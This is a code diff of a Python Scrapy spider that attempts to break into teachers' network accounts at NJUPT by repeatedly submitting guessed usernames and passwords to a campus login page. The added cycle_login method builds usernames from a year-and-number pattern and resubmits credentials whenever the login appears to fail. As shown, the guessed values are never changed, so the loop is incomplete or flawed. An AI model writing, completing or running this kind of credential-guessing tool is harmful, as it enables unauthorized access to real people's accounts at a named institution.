@@ -1,34 +1,39 @@
 # -*- coding: utf-8 -*-
 """crawl NJUPT teachers' accounts"""
 import scrapy
-from scrapy.http.cookies import CookieJar
-from scrapy.utils.response import open_in_browser
-
+from NjuptDrCom.items import NjuptDrComItem
 
 class TeacherAccountSpider(scrapy.Spider):
     """crawl NJUPT teachers' accounts"""
     name = 'account'
     start_urls = ['http://192.168.168.168/0.htm']
+    year = 1960
+    xxx = 000
+    password = 000000
 
     def parse(self, response):
-        cookie_jar = CookieJar()
+        username = '10100' + str(self.year) + '0' + str(self.xxx) + '00'
+        password = str(self.password)
         yield scrapy.FormRequest.from_response(response=response,
                                                formdata={
                                                    # xxxx is year, xxx is random
-                                                   'DDDDD': '10100xxxx0xxx00',  # username
-                                                   'upass': 'password'  # password
+                                                   'DDDDD': username,
+                                                   'upass': password  # password
                                                },
-                                               meta={'cookieJar': cookie_jar._cookies},
-                                               callback=self.after_login
-                                               )
+                                               callback=self.cycle_login
+                                              )
 
-    @staticmethod
-    def after_login(response):
-        """check whether login successfully"""
-        open_in_browser(response)
+    def cycle_login(self, response):
+        """try password and account again and again"""
+        username = '10100' + str(self.year) + '0' + str(self.xxx) + '00'
+        password = str(self.password)
         status = response.xpath('//input/@value').extract()
-        onload = response.xpath('//input/@value').extract()
-        if status is None:
-            print("\n\n\n\n\nget nothing\n\n\n\n\n")
-        else:
-            return {repr(status): repr(onload)}
+        if '返' in ''.join(map(str, status)):
+            yield scrapy.FormRequest.from_response(response=response,
+                                                   formdata={
+                                                       # xxxx is year, xxx is random
+                                                       'DDDDD': username,
+                                                       'upass': password  # password
+                                                   },
+                                                   callback=self.cycle_login
+                                                  )
